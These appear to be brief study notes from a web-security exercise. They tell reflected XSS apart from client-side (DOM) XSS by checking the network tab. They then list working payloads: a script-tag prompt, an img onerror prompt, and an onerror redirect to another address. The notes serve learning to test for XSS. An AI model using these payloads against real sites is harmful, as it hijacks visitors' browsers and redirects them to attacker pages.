


user i/p is reflected so maybe it is reflected XSS??

check network tab in dev tools when entering a new item, we dont get a response back which means it is all happening on client side
In reflected XSS we get a response from server after entering an input which can be seen in the network tab

```js
<script>prompt(1)</script>
```
this becomes part of the page but we need something to trigger it

try other payload

```html
<img src onerror="prompt(1)"/>
```

to forward the user to different location

```html
<img src onerror="window.location.href='targetAddress'">
```
targetURL also inside quotes

 
